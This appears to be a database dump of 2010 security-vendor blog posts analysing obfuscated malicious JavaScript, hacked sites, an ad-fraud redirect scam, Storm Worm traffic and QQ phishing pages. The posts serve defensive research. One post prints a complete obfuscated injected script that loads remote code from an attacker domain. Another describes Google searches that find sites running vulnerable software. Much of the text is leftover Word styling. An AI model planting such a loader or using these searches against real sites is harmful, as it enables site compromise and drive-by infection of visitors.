mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   Now we have the final array. Copy and paste this to a text file as it will be required later. A closer analysis of these 3 functions tells us that all these functions are being used to decode strings like “eval”, “fromCharCode” and “String.fromCharCode”. Simple array substitution is used to decode these strings. I have added comments for all these functions in the image below:  <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   We have almost completed decoding this script. The array is passed to a JavaScript function called “String.fromCharCode()”. Let’s see the output of this by using a simple alert message and the array(). Open a test html file and paste these lines along with the array variables which we saved earlier.    alert(String.fromCharCode(......array));    This code delivers yet another obfuscated script. Here is the screenshot of the message box,   <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   Copy this script and open up Malzilla, which can now handle the remainder of the decoding.  <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->  <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->  The whole heavily obfuscated script decodes to one “object” tag pointing to another malicious URL. From the type of object, it is clear that it is requesting a PDF file, which is presumably malicious. Now, let’s run the original exploit code in the controlled environment and see the packet capture.    <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;} @font-face 	{font-family:\"ヒラギノ角ゴ Pro W3\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;} @font-face 	{font-family:Thonburi; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} a:link, span.MsoHyperlink 	{mso-style-priority:99; 	color:blue; 	text-decoration:underline; 	text-underline:single;} a:visited, span.MsoHyperlinkFollowed 	{mso-style-noshow:yes; 	mso-style-priority:99; 	color:purple; 	mso-themecolor:followedhyperlink; 	text-decoration:underline; 	text-underline:single;} p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph 	{mso-style-priority:34; 	mso-style-unhide:no; 	mso-style-qformat:yes; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:.5in; 	mso-add-space:auto; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst 	{mso-style-priority:34; 	mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-type:export-only; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:0in; 	margin-left:.5in; 	margin-bottom:.0001pt; 	mso-add-space:auto; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle 	{mso-style-priority:34; 	mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-type:export-only; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:0in; 	margin-left:.5in; 	margin-bottom:.0001pt; 	mso-add-space:auto; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast 	{mso-style-priority:34; 	mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-type:export-only; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:.5in; 	mso-add-space:auto; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;}  /* List Definitions */  @list l0 	{mso-list-id:387729212; 	mso-list-type:hybrid; 	mso-list-template-ids:-1179251330 331507848 67698713 67698715 67698703 67698713 67698715 67698703 67698713 67698715;} @list l0:level1 	{mso-level-text:\"%1\\)\"; 	mso-level-tab-stop:none; 	mso-level-number-position:left; 	text-indent:-.25in; 	mso-fareast-font-family:\"Geeza Pro\";} ol 	{margin-bottom:0in;} ul 	{margin-bottom:0in;} -->   The above figure shows that the malicious script running successfully and requesting another malicious URL which replies with a single malicious PDF file. We will not going into additional details of the PDF analysis. The downloaded PDF file was again obfuscated and targeted a couple of Adobe PDF vulnerabilities.   1)      this.media.newPlayer– CVE-2009-4324  2)      util.printf() – CVE-2008-2992  3)      Collab.collectEmailInfo() -CVE-2007-5659  4)      Collab.getIcon() - CVE-2009-0927  This is another example of how attackers are using multiple, complex obfuscation techniques in their attacks. Due to this heavily obfuscation, the Virustotal result is only 5% for this malicious JavaScript.  Take Care.  Umesh', 'Malware;Vulnerability;Analysis', 'https://www.zscaler.com/blogs/research/more-and-more-obfuscation-being-used-malicious-scripts');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (528, 'Elaborate Scam For Mother\'s Day', 'Julien Sobrier', 'May 06, 2010', 'Mother\'s Day is coming soon. As for any big event, attackers and spammers are using Blackhat Search Engine Optimization (SEO) to lure users to their site.    I stumbled upon a rather elaborate scam involving tens of sites, and multiple redirections. And this time, the people getting scammed out of their money are not the user but websites paying for advertising. A US college website has been hacked. A Wodpress blog has been added in a separate folder (/gd).           Blog post inserted on hacked website      This blog contains thousands of posts about Mother\'s Days. The hackers have used all the usual SEO techniques: keyword stuffing, pages focused on 2-3 keywords, multiple cross-links with keywords as content, light pages (lot of text, no images, few Javascript and CSS code, etc.)                            Page with links to all posts      There is no link to this blog on the main website. But it shows up in searches for \"Mother\'s Day 2010.\" If you visit the URL of a post directly, the page contents are visible. But if you click on a search result from Google, you get redirected to a different site: trraf.com. This is the same behavior we saw for the fake antivirus pages. However, this one is much more complex. traff.com is used to redirect the user to another website: rosecrane.com.                            rosecrane.com \"search engine\"      This is where the scam really occurs. The links do not point directly to the shown website. Instead, each link redirect to a server on a different IP address. These servers then redirects the user to an advertising website, bidsystem.com, which finally redirects the user to the advertised site. From their website, \"BidSystem is a Cost-Per-Click (CPC) ad network\". For webmasters, this network is similar to Google Adwords: they get paid every time a user clicks on an ad on their website.    To hide the volume of traffic coming from the \"Search engine\" from BidSystem, several servers are used as intermediary: the ad network thinks users have clicked on ads on multiple different sites. The spammers are tricking the users into coming to their page, and clicking on advertisements disguised as search results. This scams the advertisers by sending them unqualified traffic, that is users that are not interested in their products but where tricked into clicking of fake links, while hiding their shady business from the add network.    The advertisers are paying a premium for bad traffic, giving away money to the scammer through their ad network. Note that also the ad network may be unaware of the scam, they too profit from it by taking a fee on each click.    This scam invloves just 2 clicks from the users, but a lot of intermediates. Here is the path the unwilling user is going through (showing the user clicks, and the transparent browser redirections)  google.com click => .edu/gd/ transparent => trraf.com transparent => rosecrane.com click => /go.php transparent => kc.mv.bidsystem.com transparent => advertised site    I have alerted the webmaster of the hacked college site. The fake blog has been brought down.    -- Julien', 'Phishing', 'https://www.zscaler.com/blogs/research/elaborate-scam-mothers-day');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (529, 'China’s NCGA Government Site Infected With Hidden Malicious Iframe', 'ThreatLabz', 'May 04, 2010', 'Today, we discovered that NingBo SME Credit Guarantee Association (NCGA), a Chinese government web site, is infected with a malicious hidden IFRAME. Of the infected page, is one where member registration is required. Here is the infected webpage:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\nThe iframe is injected at the bottom of the webpage (hxxp://nbdb.nbsme.gov.cn/reg.asp). and the following is a screenshot of the infected iframe:\r\n\r\n\r\n\r\n\r\nThe malicious iframe when decoded points to additional JavaScript. Here is the decoded script,\r\n\r\n \r\n\r\nCurrently, above mentioned malicious site is down.\r\n\r\nBe Safe.\r\n\r\nUmesh', 'Compromise', 'https://www.zscaler.com/blogs/research/chinas-ncga-government-site-infected-hidden-malicious-iframe');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (530, 'How To Use Google To Be The Bad Guy, Or To Fight The Bad Guys', 'Julien Sobrier', 'May 04, 2010', 'Find vulnerable targets    When a vulnerability is disclosed in a popular software (such as Wordpress, Joomla!, Drupal, etc.), attackers can use Google to quickly find a list of websites that run the potentially vulnerable versions of the application.    This page lists few (old) vulnerabilities and the corresponding Google search to find vulnerable targets.    More recently, I was doing research on hacked Wordpress websites. The Wordpress version can be identified with this HTML code:  <meta name=\"generator\" content=\"WordPress X.X.X\" />    Google does not usually allow search for HTML source code, but only for text. However, when a page is not parsed correctly, HTML code gets indexed as regular searcheable content, which actually happens pretty often    Google can show you a list of Wordpress sites that run version 2.7.1:                   Google search results for Wordpress 2.7.1      Coupled with security feeds that include ready-to-use exploits such as SecurityFocus  this technique can let attackers find vulnerable sites within minutes of a vulnerability disclosure, before website owners have time to update their website. For example, all rcent versions of MediaWiki, except the last one, are proned to a Cross Site Request Forgery vulnerability. Most othe MediaWiki websites carry an image with the alternative text \"Powered by MediaWiki\". Using the Google search for this text, it is easy to gather a list of potentially vulnerable targets.    Find vulnerable code    Google Code Search is a powerful tool that allows advanced searches in the source code of open software. You can even use regular expressions for the searches.    This tool can be used to find different types of vulnerabilities such as:           	software that includes vulnerable versions of a library  	dangerous code patterns  	  		for example, misuse of sprintf can lead to format string vulnerabilities   		lack of buffer size checks (with the C functions gets, memcpy, etc.)  	  	      Find infected pages    But we can also use Google to find pages infected in the same fashion, or exploits running in the wild. This allows us to gather more information about the attack, to get a list of domains that serve malicious files and to create an efficient set of signatures or heuristics to protect customers.    For example, we recently found this obfuscated JavaScript maliciously injected into the home page of an Indian college website:                       <script>  var HL;if(HL!=\'H\' && HL != \'\'){HL=null};var Dr=\'\';  try {this.t=\"\";this.De=\"\";var vX=new Date();  var WQ;if(WQ!=\'S\' && WQ!=\'g\'){WQ=\'S\'};  var qG=\"\";var Io=\"\";var v=new String(\"repla\"+\"ce\");  var hu;if(hu!=\'\' && hu!=\'zr\'){hu=\'\'};var J=\'\';  var Y=RegExp;var Jq;if(Jq!=\'\' && Jq!=\'fp\'){Jq=\'\'};  this.r=\'\';var uk;if(uk!=\'\'){uk=\'n\'};  function D(x,U){var W=String(\"[ZFEt\".substr(0,1));  this.K=\"\";var u=new String(\"g\");var el=\"\";W+=U;  this.av=\'\';W+=String(\"E4q]\".substr(3));var II=new String();  this.QQ=\"\";var UB=\"\";var z=new Y(W, u);return x[v](z, new String());  var mq=new Date();};var nk=new Array();var hS;if(hS!=\'\' && hS!=\'Ll\'){hS=\'qq\'};  var Bh;if(Bh!=\'xQ\' && Bh!=\'QF\'){Bh=\'\'};this.GX=\'\';var Bl;  if(Bl!=\'\' && Bl!=\'RI\'){Bl=\'gz\'};var Qh;if(Qh!=\'\' && Qh!=\'gY\'){Qh=\'rS\'};  var I=window;var To=new Date();var k=D(\'856044815016\',\"16457\");var bk=\"\";  var E=D(\'cTrNeIaqtIeIEIlTeNmqeTnqtI\',\"TINq\");var AC;if(AC!=\'\' && AC!=\'LN\'){AC=null};  var xQp;if(xQp!=\'\' && xQp!=\'_z\'){xQp=null};var DK=\'\';var Dz=D(\'oLnLleofaede\',\"jLef\");  var cX;if(cX!=\'lX\' && cX!=\'mD\'){cX=\'\'};var ww=new Date();  var V=D(\'/BwBsZjB.BcBoZmZ/ZwZsBjZ.ZcZoBmB/ZiBbZiZbBoZ.ZcBoBmZ  /BgBoBoZgZlBeB.BcZoZmB/BxBvBiBdBeBoZsZ.BcBoZmB.ZpZhBpZ\',\"ZB\");  var h=D(\'sNcRrFiRp1t1\',\"HF1RN\");  var c=D(\'hWtZtZpW:y/W/ylYiynZkybGuZcWkysY-ycyoZmW.Z3Z7WwyaGnZ.ZcWoYmG.  GtWaWgWgYeWdy-WcyoGmZ.ZBGeZsWtZBGlyeYnGdGeWrYPyayrWty.ZrZuZ:G\',\"GyYWZ\");  T=function(){c_=document[E](h);DK=c+k;this.nE=\'\';DK+=V;this.KK=\'\';var mB=\"\";this.sD=\"\";  c_.src=DK;c_.defer=([1][0]);var SY=new String();this.dN=\"\";document.body.appendChild(c_);  var Pn;if(Pn!=\'Ec\' && Pn!=\'bQ\'){Pn=\'Ec\'};};var IA;if(IA!=\'sG\' && IA!=\'uf\'){IA=\'sG\'};  var vj=new Date();var zV=new Array();var QAC=new Array();I[Dz]=T;  var XG;if(XG!=\'Fh\'){XG=\'\'};var lEg;if(lEg!=\'qCV\'){lEg=\'\'};var C=new Date();  var lb=new String();} catch(d){};var Sj=new Array();var dQ=new Array();  </script>        This code loads another JavaScript file from BestBlenderPart.ru:                              A Google search for part of the obfuscated code shows a list of infected websites, and a few posts in forums that also list infected pages. All the injected, obfuscated JavaScript is slightly different, but the end result is the same - external JavaScript is loaded on port 8080 from several domains such as easyfunguide.at, reachsaw.ru, forredtag.ru, etc. With this information, we can blacklist the malicious files, and develop good heuristics to block infected pages.                                       Infected pages found by a Google search     -- Julien', 'Compromise', 'https://www.zscaler.com/blogs/research/how-use-google-be-bad-guy-or-fight-bad-guys');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (531, 'Malicious Hidden Iframes Using Publicly Available Base64 Encode/decode Script', 'ThreatLabz', 'May 02, 2010', 'As we have seen, many websites are infected with malicious IFRAMES. The IFRAMES are either injected as plain text or they are heavily obfuscated using JavaScript. Obfuscation is intentionally used by attackers to bypass AV or IPS engines. Attackers are not only using simple obfuscation techniques to encode malicious IFRAMES, they are also using publicly available Base64 encoding/decoding routines to encode their content. Recently, we found one website which was infected with a malicious IFRAME leveraging such a technique. Here is the screenshot of the webpage:                 As can be seen, the JavaScript code after the tag looks suspicious. Strings such as CRYPT.decode, CRYPT.obfuscate and eval() tell us that this script is likely malicious. Let’s format the code JavaScript so that it’s easier to read. Here is the formatted code:          This is the initial part of the JavaScript, which is being used to encrypt the script using signature and key strings. The key string is a long string containing upper and lower case characters, numbers and special characters. Let’s look at the remainder of the script:          Here, we see a function called _utf8_decode() being used to decode the script and there is also a call to an eval() function. If we decode it using a tool called Malzilla, you will see the following hidden malicious IFRAME:          Interestingly, the code used for this encoding technique is publicly available on the Internet. In fact, this Base64 encoding/decoding routine is a part of the webtoolkit. The name of the JavaScript file in question is “webtoolkit.base64.js”. Here is the screenshot of webpage:          In this case, the attacker has used the same code to encode the malicious script with a few minor changes such as adding an eval() function to the script. This shows just how easy for an attacker to create obfuscated JavaScript using publicly available code. Though, the webtoolkit JavaScript is being written for a legitimate purpose, attackers are taking advantage of the freely available code. Detection of this technique remains poor among antivirus vendors. Only 17 vendors out of 41 are detecting this malicious script. The Virustotal results also show that’s many large vendors such as Symantec, Microsoft, Mcafee, etc. are still missing protection for this malicious script. The IFRAME attacks are not new but we are now seeing attackers taking advantages of additional techniques to obfuscate their attacks. Has your source code used in such attacks?    That’s it for now.    Umesh', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/malicious-hidden-iframes-using-publicly-available-base64-encodedecode-script');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (532, 'Storm Worm 2.0', 'ThreatLabz', 'April 30, 2010', 'A detailed analysis was provided, here, on the new version of the Storm Worm making it\'s rounds this week.  I went looking in our logs for HTTP POSTs to three and four character GIF and JPG files with relatively small request and response sizes (<1000 bytes).  What I found was a number of transactions to 91.212.127.114 (on Telos, no PTR record).A small snippet of transactions:There is a ThreatExpert report on the related server / malware, which is identified as Email-Worm.Zhelatin (name used by Kaspersky and F-Secure for the Storm Worm).  The infected hosts connect out to mail servers in attempts to mass-mail and infect others.  Here is a list of some of the email servers that it connects to:Keep an eye out for these types of transactions within your networks.', 'Malware', 'https://www.zscaler.com/blogs/research/storm-worm-20');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (533, 'Following Recent QQ Phishes', 'ThreatLabz', 'April 28, 2010', 'QQ is a popular email and instant messaging service within China.  In yesterday\'s logs I saw entries for:aq.qq.com.cn-inddex.comqq.com.cn.indexx-cn.comFollowing the pages, the display looks identical to the qq.com pages.  Click on the login within the phish and a login similar to qq.com is displayed.  The above screenshot is of the phish login prompt.The phish pages load a lot of external content from qq.com, however the login form is local on the phish server:/images/login.htmViewing the source of the page, it appears that the credentials are passed to qq.com, but are also POSTed locally on the phish sites to the file:/mb_reset/mb_reset_index.aspThe phish URLs are not currently listed in Phishtank or other blacklists.  (Update: I added these to Phishtank).When we view the domain registration / hosting information for the legit qq.com:Domain Name ..................... qq.comName Server ..................... dns1.imok.netdns2.imok.netdns3.imok.netRegistrant ID ................... hc041720747-cnRegistrant Name ................. echo mengRegistrant Organization ......... Shenzhen Tencent Computer Systems Company LimitedRegistrant Address .............. 10 F, Fiyta Building, Gaoxinnanyi Avenue, Southern DistrictRegistrant City ................. ShenzhenRegistrant Province/State ....... GuangdongRegistrant Postal Code .......... 518057Registrant Country Code ......... CNRegistrant Phone Number ......... +86.075586013388 -Registrant Fax .................. +86.075586013090 -Registrant Email ................ aq.qq.com.        6941    IN    A    58.251.61.155aq.qq.com.        6941    IN    A    58.251.61.153aq.qq.com.        6941    IN    A    58.251.61.154aq.qq.com.        6941    IN    A    58.251.61.152NetRange:   58.0.0.0 - 58.255.255.255CIDR:       58.0.0.0/8NetName:    APNIC-58Whereas the phishing sites were recently registered through Melbourne IT and hosted on Yahoo servers:Domain Name: CN-INDDEX.COMRegistrar: MELBOURNE IT, LTD. D/B/A INTERNET NAMES WORLDWIDEWhois Server: whois.melbourneit.comReferral URL: http://www.melbourneit.comName Server: 